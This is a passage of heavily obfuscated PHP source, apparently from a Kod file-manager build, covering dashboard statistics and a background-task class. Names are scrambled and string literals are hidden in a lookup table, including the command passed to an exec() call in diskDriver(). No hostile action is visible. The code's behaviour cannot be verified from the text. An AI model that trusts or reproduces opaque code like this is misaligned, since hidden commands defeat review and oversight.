$‚’ò¯‚ = $this->trendList($Úğòöâš); if ($‚’ò¯‚ && $¥ƒ×· != $®Ä˜ºë€[1677]) { $Ùêğ•Ç¬ = $‚’ò¯‚[0][$®Ä˜ºë€[241]]; $™²°óµ = $this->validDate($¥ƒ×·, $Ùêğ•Ç¬); $é›òá½´ = array(); $éá‘æ§› = array_to_keyvalue($‚’ò¯‚, $®Ä˜ºë€[241]); foreach ($™²°óµ as $ù¶ÇÅ±) { if (isset($éá‘æ§›[$ù¶ÇÅ±])) { $°„«ÚŒŞ = $éá‘æ§›[$ù¶ÇÅ±]; } else { $°„«ÚŒŞ = end($‚’ò¯‚); $°„«ÚŒŞ[$®Ä˜ºë€[241]] = $ù¶ÇÅ±; if ($Úğòöâš == $®Ä˜ºë€[633]) { $°„«ÚŒŞ[$®Ä˜ºë€[1832]] = $°„«ÚŒŞ[$®Ä˜ºë€[1833]] = 0; } } $é›òá½´[] = $°„«ÚŒŞ; } $‚’ò¯‚ = $é›òá½´; } $Œ³Ê“šŞ = array($®Ä˜ºë€[633] => array($®Ä˜ºë€[812] => LNG($®Ä˜ºë€[1848]), $®Ä˜ºë€[1832] => LNG($®Ä˜ºë€[1849]), $®Ä˜ºë€[1833] => LNG($®Ä˜ºë€[1850])), $®Ä˜ºë€[1834] => array($®Ä˜ºë€[810] => LNG($®Ä˜ºë€[1851]), $®Ä˜ºë€[1836] => LNG($®Ä˜ºë€[1852]), $®Ä˜ºë€[1837] => LNG($®Ä˜ºë€[1853]), $®Ä˜ºë€[1838] => LNG($®Ä˜ºë€[1854]))); $Ïé—†ğ² = array($®Ä˜ºë€[633] => $®Ä˜ºë€[1855], $®Ä˜ºë€[1834] => $®Ä˜ºë€[78]); if (empty($‚’ò¯‚)) { $ù¶ÇÅ± = date($®Ä˜ºë€[1839], strtotime($®Ä˜ºë€[1840])); $İ…¿°àÏ = array($®Ä˜ºë€[241] => $ù¶ÇÅ±); foreach ($Œ³Ê“šŞ[$Úğòöâš] as $ĞŸ¸æ± => $­Ç°áÀÇ) { $İ…¿°àÏ[$ĞŸ¸æ±] = 0; } $‚’ò¯‚[] = $İ…¿°àÏ; } $¢ÉÔ—ÅŞ = array(); foreach ($‚’ò¯‚ as $­Ç°áÀÇ) { if ($Úğòöâš == $®Ä˜ºë€[1834] && $­Ç°áÀÇ[$®Ä˜ºë€[1836]] > $­Ç°áÀÇ[$®Ä˜ºë€[810]]) { $­Ç°áÀÇ[$®Ä˜ºë€[1836]] = $­Ç°áÀÇ[$®Ä˜ºë€[810]]; } foreach ($Œ³Ê“šŞ[$Úğòöâš] as $ĞŸ¸æ± => $ÛËê“µ¡) { $°„«ÚŒŞ = array($®Ä˜ºë€[241] => $­Ç°áÀÇ[$®Ä˜ºë€[241]], $®Ä˜ºë€[1600] => $ÛËê“µ¡); $°„«ÚŒŞ[$Ïé—†ğ²[$Úğòöâš]] = isset($­Ç°áÀÇ[$ĞŸ¸æ±]) ? $­Ç°áÀÇ[$ĞŸ¸æ±] : 0; $¢ÉÔ—ÅŞ[] = $°„«ÚŒŞ; } } return $¢ÉÔ—ÅŞ; } public function validDate($êĞÇ”Ïû, $àè¬·–É) { $ª«Ïıª =& $_SERVER[Î‹ÃÂŞ„]; $ç¦°Ö„ú = date($ª«Ïıª[1839], strtotime($ª«Ïıª[1840])); $ñõ¹“ÎÒ = array($ç¦°Ö„ú); switch ($êĞÇ”Ïû) { case $ª«Ïıª[1684]: $Ü‰ª·Œê = mktime(0, 0, 0, date($ª«Ïıª[1856]), date($ª«Ïıª[1417]) - date($ª«Ïıª[1482]) + 7 - 7, date($ª«Ïıª[1857])); $Ğ¶ˆÑÊš = 0; do { $ŒûûœïÔ = date($ª«Ïıª[1839], $Ü‰ª·Œê - 3600 * 24 * 7 * $Ğ¶ˆÑÊš); $ñõ¹“ÎÒ[] = $ŒûûœïÔ; $Ğ¶ˆÑÊš++; } while ($àè¬·–É < $ŒûûœïÔ); break; case $ª«Ïıª[1682]: $Ğ¶ˆÑÊš = 1; do { $„ŒùÕî¤ = date($ª«Ïıª[1858], strtotime("\x2d\x20{$Ğ¶ˆÑÊš}\40\x6d\x6f\156\164\x68\163")); $ñõ¹“ÎÒ[] = $„ŒùÕî¤; $Ğ¶ˆÑÊš++; } while ($àè¬·–É < $„ŒùÕî¤); break; case $ª«Ïıª[1859]: $¼¡Ôì©Ä = (int) date($ª«Ïıª[1857], strtotime($àè¬·–É)); $şÓ¶Ğ£Ó = (int) date($ª«Ïıª[1857]); if ($¼¡Ôì©Ä >= $şÓ¶Ğ£Ó) { break; } for ($¼¡Ôì©Ä; $¼¡Ôì©Ä < $şÓ¶Ğ£Ó; $¼¡Ôì©Ä++) { $ñõ¹“ÎÒ[] = $¼¡Ôì©Ä . $ª«Ïıª[1860]; } break; default: break; } if ($àè¬·–É > end($ñõ¹“ÎÒ)) { array_pop($ñõ¹“ÎÒ); } sort($ñõ¹“ÎÒ); return $ñõ¹“ÎÒ; } public function listTable($°˜ÕîÛÃ) { $ï·ñ«æÄ = ucfirst($°˜ÕîÛÃ); return Model($ï·ñ«æÄ)->listData(); } public function option($®˜á”‹) { $‘àı–•î = $_SERVER[Î‹ÃÂŞ„][1861] . ucfirst($®˜á”‹); return $this->{$‘àı–•î}(); } private function optionUser() { $¡ç²˜ºş =& $_SERVER[Î‹ÃÂŞ„]; $ÜÕ˜£Ù¸ = Model($¡ç²˜ºş[570])->count($¡ç²˜ºş[1704]); $Áşû¼öË = Model($¡ç²˜ºş[570])->where($¡ç²˜ºş[1862])->count($¡ç²˜ºş[1704]); $”×“ÎÆ = intval($GLOBALS[$¡ç²˜ºş[6]][$¡ç²˜ºş[395]][$¡ç²˜ºş[1656]]) / 3600; $úÏÚÉÜ¸ = strtotime("\55{$”×“ÎÆ}\40\x68\x6f\165\162\x73"); $ÑŸôÀĞ† = strtotime(date($¡ç²˜ºş[1843])); if ($úÏÚÉÜ¸ < $ÑŸôÀĞ†) { $úÏÚÉÜ¸ = $ÑŸôÀĞ†; } $óĞõ‡ßú = array($¡ç²˜ºş[1863] => array($¡ç²˜ºş[1069], $úÏÚÉÜ¸)); $Ş¼¹ï½í = (int) Model($¡ç²˜ºş[570])->where($óĞõ‡ßú)->count($¡ç²˜ºş[1704]); if (!$Ş¼¹ï½í) { $Ş¼¹ï½í = 1; } $óĞõ‡ßú = array($¡ç²˜ºş[1863] => array($¡ç²˜ºş[1069], $ÑŸôÀĞ†)); $³Œ—êÁ× = Model($¡ç²˜ºş[570])->where($óĞõ‡ßú)->count($¡ç²˜ºş[1704]); return array($¡ç²˜ºş[805] => (int) $ÜÕ˜£Ù¸, $¡ç²˜ºş[1864] => (int) ($ÜÕ˜£Ù¸ - $Áşû¼öË), $¡ç²˜ºş[1865] => (int) $Áşû¼öË, $¡ç²˜ºş[1866] => (int) $³Œ—êÁ×, $¡ç²˜ºş[1867] => $Ş¼¹ï½í); } private function optionFile() { $®Ëıç¥İ =& $_SERVER[Î‹ÃÂŞ„]; $¾±ª½  = $this->sourceSize(); $‚óĞ£Ê¾ = $¾±ª½ [$®Ëıç¥İ[78]]; $Æçøª» = $¾±ª½ [$®Ëıç¥İ[1836]]; $ÚÓ‰óĞ = Model($®Ëıç¥İ[872])->where(array($®Ëıç¥İ[455] => 0))->count($®Ëıç¥İ[183]); $Æü‹ğ÷» = array($®Ëıç¥İ[455] => 0, $®Ëıç¥İ[217] => array($®Ëıç¥İ[1069], strtotime(date($®Ëıç¥İ[1843])))); $¤ëÂŞù£ = Model($®Ëıç¥İ[872])->where($Æü‹ğ÷»)->sum($®Ëıç¥İ[78]); $³¤ñÀ°€ = Model($®Ëıç¥İ[872])->where($Æü‹ğ÷»)->count($®Ëıç¥İ[183]); return array($®Ëıç¥İ[810] => $‚óĞ£Ê¾, $®Ëıç¥İ[1836] => $Æçøª», $®Ëıç¥İ[1868] => $‚óĞ£Ê¾ - $Æçøª», $®Ëıç¥İ[1869] => (int) $¤ëÂŞù£, $®Ëıç¥İ[812] => (int) $ÚÓ‰óĞ, $®Ëıç¥İ[1870] => (int) $³¤ñÀ°€); } private function optionAccess() { $‹¾à“ú =& $_SERVER[Î‹ÃÂŞ„]; return array($‹¾à“ú[805] => $this->typeLogCnt(), $‹¾à“ú[109] => $this->typeLogCnt($‹¾à“ú[109]), $‹¾à“ú[495] => $this->typeLogCnt($‹¾à“ú[495]), $‹¾à“ú[1871] => $this->typeLogCnt($‹¾à“ú[1871]), $‹¾à“ú[1872] => $this->typeLogCnt($‹¾à“ú[1872]), $‹¾à“ú[633] => $this->typeLogCnt($‹¾à“ú[12], $‹¾à“ú[1847])); } private function typeLogCnt($£­ú¥Ş = '', $³’±÷ÄÕ = "\151\x64") { $Ç—Ä®»Ú =& $_SERVER[Î‹ÃÂŞ„]; $ÚÉĞ‘Ôõ = array($Ç—Ä®»Ú[109] => array($Ç—Ä®»Ú[1873], $Ç—Ä®»Ú[1874]), $Ç—Ä®»Ú[495] => array($Ç—Ä®»Ú[1875], $Ç—Ä®»Ú[1876]), $Ç—Ä®»Ú[1871] => array($Ç—Ä®»Ú[1877], $Ç—Ä®»Ú[1878], $Ç—Ä®»Ú[1879]), $Ç—Ä®»Ú[1872] => array($Ç—Ä®»Ú[1880], $Ç—Ä®»Ú[1881]), $Ç—Ä®»Ú[1882] => array($Ç—Ä®»Ú[1883], $Ç—Ä®»Ú[1884], $Ç—Ä®»Ú[1885])); $½„£èëÍ = strtotime(date($Ç—Ä®»Ú[1843])); $ˆ¯ß£­¼ = array($Ç—Ä®»Ú[217] => array($Ç—Ä®»Ú[1069], $½„£èëÍ)); if ($£­ú¥Ş) { $ˆ¯ß£­¼[$Ç—Ä®»Ú[33]] = array($Ç—Ä®»Ú[7], $ÚÉĞ‘Ôõ[$£­ú¥Ş]); } $òµœˆá½ = Model($Ç—Ä®»Ú[1846])->where($ˆ¯ß£­¼)->count($³’±÷ÄÕ); return (int) $òµœˆá½; } private function optionServer() { $ô˜“’ñı =& $_SERVER[Î‹ÃÂŞ„]; $£†í³¨ = $this->diskDriver(); $¿ç”‹¥ = KodIO::defaultDriver(); $¥Ó¡÷Ô— = array($ô˜“’ñı[864] => $¿ç”‹¥[$ô˜“’ñı[445]]); $Æ×¬èù’ = Model($ô˜“’ñı[514])->where($¥Ó¡÷Ô—)->sum($ô˜“’ñı[78]); $•˜Í¦æÖ = explode($ô˜“’ñı[53], $_SERVER[$ô˜“’ñı[146]]); $óõ¶ı“† = $•˜Í¦æÖ[0]; $õ¶©Ú÷ = $GLOBALS[$ô˜“’ñı[6]][$ô˜“’ñı[21]]; $€Ò¡¡…Ë = $õ¶©Ú÷[$ô˜“’ñı[1031]]; if ($€Ò¡¡…Ë == $ô˜“’ñı[1019]) { $µú­ßŞÑ = explode($ô˜“’ñı[1337], $õ¶©Ú÷[$ô˜“’ñı[1030]]); $€Ò¡¡…Ë = $µú­ßŞÑ[0]; } if ($€Ò¡¡…Ë == $ô˜“’ñı[966] || $€Ò¡¡…Ë == $ô˜“’ñı[851]) { $é¤«â„é = Model()->db()->query($ô˜“’ñı[1886]); $¸™ÉØ†š = $é¤«â„é[0] && isset($é¤«â„é[0][$ô˜“’ñı[1599]]) ? $é¤«â„é[0][$ô˜“’ñı[1599]] : 0; $€Ò¡¡…Ë = $ô˜“’ñı[1887] . ($¸™ÉØ†š ? $ô˜“’ñı[8] . $¸™ÉØ†š : $ô˜“’ñı[12]); } $ë™ö´ŞÜ = $GLOBALS[$ô˜“’ñı[6]][$ô˜“’ñı[395]][$ô˜“’ñı[874]]; return array($ô˜“’ñı[1888] => $£†í³¨ ? $£†í³¨[$ô˜“’ñı[1889]] : 0, $ô˜“’ñı[1890] => $£†í³¨ ? $£†í³¨[$ô˜“’ñı[1891]] : 0, $ô˜“’ñı[1892] => (int) $¿ç”‹¥[$ô˜“’ñı[1889]] * 1024 * 1024 * 1024, $ô˜“’ñı[1893] => (int) $Æ×¬èù’, $ô˜“’ñı[1894] => ucfirst($óõ¶ı“†), $ô˜“’ñı[1895] => $ô˜“’ñı[1896] . PHP_VERSION, $ô˜“’ñı[1897] => phpBuild64() ? 64 : 32, $ô˜“’ñı[804] => str_replace($ô˜“’ñı[1185], $ô˜“’ñı[1047], $€Ò¡¡…Ë), $ô˜“’ñı[395] => ucfirst($ë™ö´ŞÜ), $ô˜“’ñı[32] => $_SERVER[$ô˜“’ñı[1898]]); } private function diskDriver() { $ÂôËœù² =& $_SERVER[Î‹ÃÂŞ„]; $¢¸ğæµ = $ÂôËœù²[8]; $×¬ÓÄ† = $GLOBALS[$ÂôËœù²[6]][$ÂôËœù²[1354]] == $ÂôËœù²[1355]; if ($×¬ÓÄ†) { $¢¸ğæµ = $ÂôËœù²[1899]; if (function_exists($ÂôËœù²[1900])) { exec($ÂôËœù²[1901], $œçÖÅ·ü); $¢¸ğæµ = $œçÖÅ·ü[1] . $ÂôËœù²[8]; } } if (!file_exists($¢¸ğæµ)) { return; } $ùÓ‰¬— = @disk_total_space($¢¸ğæµ); $éößò“Ê = $ùÓ‰¬— - @disk_free_space($¢¸ğæµ); return array($ÂôËœù²[1889] => $ùÓ‰¬—, $ÂôËœù²[1891] => $éößò“Ê); } public function fileChart($… ËÜÍ°) { $ëáëÓßÏ =& $_SERVER[Î‹ÃÂŞ„]; if (isset($… ËÜÍ°[$ëáëÓßÏ[1704]])) { return Model($ëáëÓßÏ[872])->userFileTypeProfile($… ËÜÍ°[$ëáëÓßÏ[1704]]); } if (isset($… ËÜÍ°[$ëáëÓßÏ[1902]])) { return Model($ëáëÓßÏ[872])->groupFileTypeProfile($… ËÜÍ°[$ëáëÓßÏ[1902]]); } $‡š¦¿õ = $this->sourceSize(); $ãÛÆÖ›¢ = array($ëáëÓßÏ[182] => 0, $ëáëÓßÏ[180] => 1); $ãüéŠ• = Model($ëáëÓßÏ[872])->where($ãÛÆÖ›¢)->sum($ëáëÓßÏ[78]); $ãÛÆÖ›¢[$ëáëÓßÏ[180]] = 2; $ù…Ò½Î = Model($ëáëÓßÏ[872])->where($ãÛÆÖ›¢)->sum($ëáëÓßÏ[78]); return array($ëáëÓßÏ[810] => $‡š¦¿õ[$ëáëÓßÏ[78]], $ëáëÓßÏ[1836] => $‡š¦¿õ[$ëáëÓßÏ[1836]], $ëáëÓßÏ[1837] => (int) $ãüéŠ•, $ëáëÓßÏ[1838] => (int) $ù…Ò½Î); } private function sourceSize() { $Š•ÖÎê =& $_SERVER[Î‹ÃÂŞ„]; $üÌ²¥é = Model($Š•ÖÎê[872])->where(array($Š•ÖÎê[455] => 0))->sum($Š•ÖÎê[78]); $©ÓÂÊ€Í = Model($Š•ÖÎê[514])->sum($Š•ÖÎê[78]); if ($©ÓÂÊ€Í > $üÌ²¥é) { $©ÓÂÊ€Í = $üÌ²¥é; } return array($Š•ÖÎê[78] => (int) $üÌ²¥é, $Š•ÖÎê[1836] => (int) $©ÓÂÊ€Í); } } goto D‚›’©ÖÔ; D¾¯ìøê²â: class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\x72\165\x6e\x6e\x69\156\x67"; const STATYS_KILL = "\153\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($‡òÖ‚¢ß, $º‘šÔé÷ = '', $¸ÖÀƒ‰º = 0, $ºùÙÜ± = '') { $öøÌûË =& $_SERVER[Î‹ÃÂŞ„]; if (self::get($‡òÖ‚¢ß)) { return; } $this->task = array($öøÌûË[445] => $‡òÖ‚¢ß, $öøÌûË[1704] => USER_ID, $öøÌûË[1600] => $ºùÙÜ±, $öøÌûË[496] => $öøÌûË[12], $öøÌûË[33] => $º‘šÔé÷, $öøÌûË[1119] => $öøÌûË[12], $öøÌûË[833] => $¸ÖÀƒ‰º, $öøÌûË[1705] => 0, $öøÌûË[1706] => 0, $öøÌûË[1707] => 0, $öøÌûË[1708] => timeFloat(), $öøÌûË[1709] => 0, $öøÌûË[1710] => 0, $öøÌûË[1711] => 0, $öøÌûË[1712] => 0, $öøÌûË[797] => $öøÌûË[1660]); $GLOBALS[$öøÌûË[1713]] = 1; Hook::bind($öøÌûË[1664], array($this, $öøÌûË[1714])); Hook::bind($öøÌûË[1715], array($this, $öøÌûË[1716])); $this->startAfter(); Hook::trigger($öøÌûË[1717], $this->task); $this->task[$öøÌûË[1710]] = timeFloat(); } public function end($œ„“ÇÔƒ = '') { $ó»×±İŠ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ó»×±İŠ[1710]]) { self::valueSet($this->task[$ó»×±İŠ[445]], !1); } $this->isEnd = !0; if ($œ„“ÇÔƒ) { $this->task[$ó»×±İŠ[496]] = $œ„“ÇÔƒ; } self::log($ó»×±İŠ[1718] . $this->task[$ó»×±İŠ[445]] . $ó»×±İŠ[1719] . sprintf($ó»×±İŠ[898], timeFloat() - $this->task[$ó»×±İŠ[1708]]) . $ó»×±İŠ[1720]); Hook::unbind($ó»×±İŠ[1664], array($this, $ó»×±İŠ[1714])); Hook::unbind($ó»×±İŠ[1715], array($this, $ó»×±İŠ[1716])); $this->endAfter(); $ù’ßà„” = $this->task; $this->task = !1; Hook::trigger($ó»×±İŠ[1721], $ù’ßà„”); } public function update($Êé’ı = 0, $ø•øë¡ = false) { $âûæº©Ü =& $_SERVER[Î‹ÃÂŞ„]; $ö…°ù´ù =& $this->task; if (!$ö…°ù´ù) { return; } $ö…°ù´ù[$âûæº©Ü[1705]] += $Êé’ı; $ö…°ù´ù[$âûæº©Ü[1709]] = timeFloat(); if ($ö…°ù´ù[$âûæº©Ü[833]]) { if ($ö…°ù´ù[$âûæº©Ü[833]] < $ö…°ù´ù[$âûæº©Ü[1705]]) { $ö…°ù´ù[$âûæº©Ü[833]] = $ö…°ù´ù[$âûæº©Ü[1705]]; } $Â±¥üÁ¨ = timeFloat() - $ö…°ù´ù[$âûæº©Ü[1708]] - $ö…°ù´ù[$âûæº©Ü[1711]]; if ($Â±¥üÁ¨ <= 0) { $Â±¥üÁ¨ = 0.001; } $ö…°ù´ù[$âûæº©Ü[1706]] = $ö…°ù´ù[$âûæº©Ü[1705]] / $ö…°ù´ù[$âûæº©Ü[833]]; $ö…°ù´ù[$âûæº©Ü[1707]] = $ö…°ù´ù[$âûæº©Ü[1705]] / $Â±¥üÁ¨; if ($ö…°ù´ù[$âûæº©Ü[1706]] > 0) { $ö…°ù´ù[$âûæº©Ü[1712]] = $Â±¥üÁ¨ * (1 - $ö…°ù´ù[$âûæº©Ü[1706]]) / $ö…°ù´ù[$âûæº©Ü[1706]]; } $ö…°ù´ù[$âûæº©Ü[1712]] = $ö…°ù´ù[$âûæº©Ü[1712]] <= 0 ? 0 : $ö…°ù´ù[$âûæº©Ü[1712]]; } $this->updateAfter(); $†¾õÄõò = 0.2; if (timeFloat() - $ö…°ù´ù[$âûæº©Ü[1710]] < $†¾õÄõò && !$ø•øë¡) { return; } $„ÜÔİåî = self::get($ö…°ù´ù[$âûæº©Ü[445]]); $±äğç½ô = $„ÜÔİåî[$âûæº©Ü[797]]; if ($±äğç½ô == self::STATYS_KILL) { $·Àí›  = array($âûæº©Ü[1722] => LNG($âûæº©Ü[1723]), $âûæº©Ü[1267] => !1); Cache::set($âûæº©Ü[1724] . $this->task[$âûæº©Ü[445]], $·Àí› , 30); $this->onKill(); $this->end(); die; } else { if ($±äğç½ô == self::STATYS_STOP) { $Ùåèñû = 2; $„ÜÔİåî[$âûæº©Ü[1711]] += $Ùåèñû; self::valueSet($ö…°ù´ù[$âûæº©Ü[445]], $„ÜÔİåî); sleep($Ùåèñû); $this->update(); return; } } $ö…°ù´ù[$âûæº©Ü[797]] = $±äğç½ô ? $±äğç½ô : $ö…°ù´ù[$âûæº©Ü[797]]; $ö…°ù´ù[$âûæº©Ü[1711]] = $„ÜÔİåî[$âûæº©Ü[1711]] ? $„ÜÔİåî[$âûæº©Ü[1711]] : 0; $ö…°ù´ù[$âûæº©Ü[1710]] = timeFloat(); Hook::trigger($âûæº©Ü[1725], $ö…°ù´ù); self::valueSet($ö…°ù´ù[$âûæº©Ü[445]], $ö…°ù´ù); } public function onKillSet($š¦‰Ê¥ , $ÛÊù¼Ä™ = array()) { $this->onKillCall = array($š¦‰Ê¥ , $ÛÊù¼Ä™); } public function onKill() { $À³‚Ÿø =& $_SERVER[Î‹ÃÂŞ„]; self::log($À³‚Ÿø[1718] . $this->task[$À³‚Ÿø[445]] . $À³‚Ÿø[1726]); Hook::trigger($À³‚Ÿø[1727], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ŞééÌñ´) { $§úÇ¡ˆĞ =& $_SERVER[Î‹ÃÂŞ„]; Cache::set($§úÇ¡ˆĞ[1724] . $this->task[$§úÇ¡ˆĞ[445]], $ŞééÌñ´, 60); return $ŞééÌñ´; } public static function get($ú‹Çºşì) { $èÊôÉ”À =& $_SERVER[Î‹ÃÂŞ„]; $Ú‚œ´êÏ = self::valueGet($ú‹Çºşì); if (is_array($Ú‚œ´êÏ) && $Ú‚œ´êÏ[$èÊôÉ”À[1728]]) { $Ÿçß÷’Ğ = ActionApply($Ú‚œ´êÏ[$èÊôÉ”À[1728]], array($Ú‚œ´êÏ)); $Ú‚œ´êÏ = is_array($Ÿçß÷’Ğ) ? $Ÿçß÷’Ğ : $Ú‚œ´êÏ; } return $Ú‚œ´êÏ; } public static function listData() { $çåšó¸‘ = self::valueGet(); return array_sort_by($çåšó¸‘, $_SERVER[Î‹ÃÂŞ„][1708], !0); } public static function kill($š¼˜†ä‚) { return self::changeStatus($š¼˜†ä‚, self::STATYS_KILL); } public static function stop($òİÙ ¡€) { return self::changeStatus($òİÙ ¡€, self::STATYS_STOP); } public static function restart($ÉËœ½ ì) { return self::changeStatus($ÉËœ½ ì, self::STATYS_RUNNING); } public static function killAll() { $Ê¡ĞŒ™ =& $_SERVER[Î‹ÃÂŞ„]; $•ğ¡Ú´ú = self::listData(); foreach ($•ğ¡Ú´ú as $·ˆÒĞô) { self::kill($·ˆÒĞô[$Ê¡ĞŒ™[445]]); } sleep(2); foreach ($•ğ¡Ú´ú as $·ˆÒĞô) { self::valueSet($·ˆÒĞô[$Ê¡ĞŒ™[445]], !1); } } private static function changeStatus($¯©ş±Ê, $ÄÌ«€Ñ¨) { $Ÿ…Ó¤³ğ =& $_SERVER[Î‹ÃÂŞ„]; $¾ı‹œ¤Ó = self::valueGet($¯©ş±Ê); if (!$¾ı‹œ¤Ó) { return !1; } $¾ı‹œ¤Ó[$Ÿ…Ó¤³ğ[797]] = $ÄÌ«€Ñ¨; self::valueSet($¯©ş±Ê, $¾ı‹œ¤Ó); self::log($Ÿ…Ó¤³ğ[1729] . $¾ı‹œ¤Ó[$Ÿ…Ó¤³ğ[445]] . $Ÿ…Ó¤³ğ[1730] . $ÄÌ«€Ñ¨); return !0; } public static function valueGet($ÍÜ¹»î = false) { $ÖÕ›´Ë“ =& $_SERVER[Î‹ÃÂŞ„]; if ($ÍÜ¹»î) { $£º¨¦¨¶ = Model($ÖÕ›´Ë“[490])->where(array($ÖÕ›´Ë“[96] => $ÍÜ¹»î, $ÖÕ›´Ë“[33] => $ÖÕ›´Ë“[1126]))->find(); return $£º¨¦¨¶ ? json_decode($£º¨¦¨¶[$ÖÕ›´Ë“[420]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ü«ŞÀ¤“ = false) { $¶“–»ª€ =& $_SERVER[Î‹ÃÂŞ„]; $¸Ó©™ = array($¶“–»ª€[33] => $¶“–»ª€[1126]); if ($Ü«ŞÀ¤“) { $¸Ó©™[$¶“–»ª€[1704]] = $Ü«ŞÀ¤“; } $ÒÔĞÛÆò = Model($¶“–»ª€[490])->where($¸Ó©™)->select(); $ÒÔĞÛÆò = $ÒÔĞÛÆò ? $ÒÔĞÛÆò : array(); foreach ($ÒÔĞÛÆò as $‘•šÀü™ => $Š®·öÁŸ) { $ÒÔĞÛÆò[$‘•šÀü™] = json_decode($Š®·öÁŸ[$¶“–»ª€[420]], !0); } return $ÒÔĞÛÆò; } public static function valueSet($ôœ’†÷ğ, $ûÃšıÑ) { $Ü‰Á«Ï =& $_SERVER[Î‹ÃÂŞ„]; if (!$ûÃšıÑ) { return Model($Ü‰Á«Ï[490])->where(array($Ü‰Á«Ï[96] => $ôœ’†÷ğ, $Ü‰Á«Ï[33] => $Ü‰Á«Ï[1126]))->delete(); } $Óê‰¦íë = json_encode($ûÃšıÑ); if (!$Óê‰¦íë) { ob_start(); var_dump($ûÃšıÑ); $°­¾’Ò¦ = ob_get_clean(); self::log($Ü‰Á«Ï[1731] . json_encode_force($°­¾’Ò¦)); } if (!$ôœ’†÷ğ || !$ûÃšıÑ[$Ü‰Á«Ï[445]]) { return !1; } $ŒÓ¦šª• = array($Ü‰Á«Ï[33] => $Ü‰Á«Ï[1126], $Ü‰Á«Ï[1704] => USER_ID, $Ü‰Á«Ï[96] => $ôœ’†÷ğ, $Ü‰Á«Ï[420] => $Óê‰¦íë); $áõ“ë¶³ = $Ü‰Á«Ï[1732]; CacheLock::lock($áõ“ë¶³); Model($Ü‰Á«Ï[490])->add($ŒÓ¦šª•, array(), !0); CacheLock::unlock($áõ“ë¶³); } public static function log($†ıØª) { if (!GLOBAL_DEBUG) { return; } write_log($†ıØª, $_SERVER[Î‹ÃÂŞ„][1733]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¼í¬À³¬ =& $_SERVER[Î‹ÃÂŞ„]; $—Áé¼§ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¼í¬À³¬[1734], array($this, $¼í¬À³¬[1735])); Hook::bind($¼í¬À³¬[1278], array($this, $¼í¬À³¬[1736])); Hook::bind($¼í¬À³¬[1737], array($this, $¼í¬À³¬[1738])); Hook::bind($¼í¬À³¬[639], array($this, $¼í¬À³¬[1739])); Hook::bind($¼í¬À³¬[640], array($this, $¼í¬À³¬[1740])); Hook::bind($¼í¬À³¬[646], array($this, $¼í¬À³¬[1741])); Hook::bind($¼í¬À³¬[647], array($this, $¼í¬À³¬[1742])); Hook::bind($¼í¬À³¬[642], array($this, $¼í¬À³¬[1743])); Hook::bind($¼í¬À³¬[644], array($this, $¼í¬À³¬[1744])); Hook::bind($¼í¬À³¬[608], array($this, $¼í¬À³¬[1745])); Hook::bind($¼í¬À³¬[605], array($this, $¼í¬À³¬[1745])); Hook::bind($¼í¬À³¬[610], array($this, $¼í¬À³¬[1745])); Hook::bind($¼í¬À³¬[612], array($this, $¼í¬À³¬[1745])); Hook::bind($¼í¬À³¬[614], array($this, $¼í¬À³¬[1745])); Hook::bind($¼í¬À³¬[1746], array($this, $¼í¬À³¬[1747])); Hook::bind($¼í¬À³¬[630], array($this, $¼í¬À³¬[1748])); $this->sourceModelCopyFlag = !1; Hook::bind($¼í¬À³¬[1749], array($this, $¼í¬À³¬[1750])); Hook::bind($¼í¬À³¬[1751], array($this, $¼í¬À³¬[1752])); Hook::bind($¼í¬À³¬[1753], array($this, $¼í¬À³¬[1754])); $—Áé¼§[$¼í¬À³¬[1755]] = LNG($¼í¬À³¬[1756]); $—Áé¼§[$¼í¬À³¬[1757]] = 0; $—Áé¼§[$¼í¬À³¬[1758]] = 0; $—Áé¼§[$¼í¬À³¬[1119]] = $¼í¬À³¬[12]; $—Áé¼§[$¼í¬À³¬[1759]] = $¼í¬À³¬[12]; $—Áé¼§[$¼í¬À³¬[1760]] = 0; $—Áé¼§[$¼í¬À³¬[1761]] = 0; $—Áé¼§[$¼í¬À³¬[1762]] = 0; if (!$—Áé¼§[$¼í¬À³¬[1600]]) { $—Áé¼§[$¼í¬À³¬[1600]] = LNG($¼í¬À³¬[1763]); } } protected function endAfter() { $íÏì«éÖ =& $_SERVER[Î‹ÃÂŞ„]; Hook::unbind($íÏì«éÖ[1734], array($this, $íÏì«éÖ[1735])); Hook::unbind($íÏì«éÖ[1278], array($this, $íÏì«éÖ[1736])); Hook::unbind($íÏì«éÖ[1737], array($this, $íÏì«éÖ[1738])); Hook::unbind($íÏì«éÖ[639], array($this, $íÏì«éÖ[1739])); Hook::unbind($íÏì«éÖ[640], array($this, $íÏì«éÖ[1740])); Hook::unbind($íÏì«éÖ[646], array($this, $íÏì«éÖ[1741])); Hook::unbind($íÏì«éÖ[647], array($this, $íÏì«éÖ[1742])); Hook::unbind($íÏì«éÖ[642], array($this, $íÏì«éÖ[1743])); Hook::unbind($íÏì«éÖ[644], array($this, $íÏì«éÖ[1744])); Hook::unbind($íÏì«éÖ[608], array($this, $íÏì«éÖ[1745])); Hook::unbind($íÏì«éÖ[605], array($this, $íÏì«éÖ[1745])); Hook::unbind($íÏì«éÖ[610], array($this, $íÏì«éÖ[1745])); Hook::unbind($íÏì«éÖ[612], array($this, $íÏì«éÖ[1745])); Hook::unbind($íÏì«éÖ[614], array($this, $íÏì«éÖ[1745])); Hook::unbind($íÏì«éÖ[1746], array($this, $íÏì«éÖ[1747])); Hook::unbind($íÏì«éÖ[630], array($this, $íÏì«éÖ[1748])); Hook::unbind($íÏì«éÖ[1749], array($this, $íÏì«éÖ[1750])); Hook::unbind($íÏì«éÖ[1751], array($this, $íÏì«éÖ[1752])); Hook::unbind($íÏì«éÖ[1753], array($this, $íÏì«éÖ[1754])); } public function copyMoveStart($½³÷›Ãæ, $„¹ø™İ§, $©ÀµËğª, $õ¸íËÓ) { $¹àô…Ù‚ =& $_SERVER[Î‹ÃÂŞ„]; self::log($¹àô…Ù‚[1764] . $„¹ø™İ§ . $¹àô…Ù‚[72] . 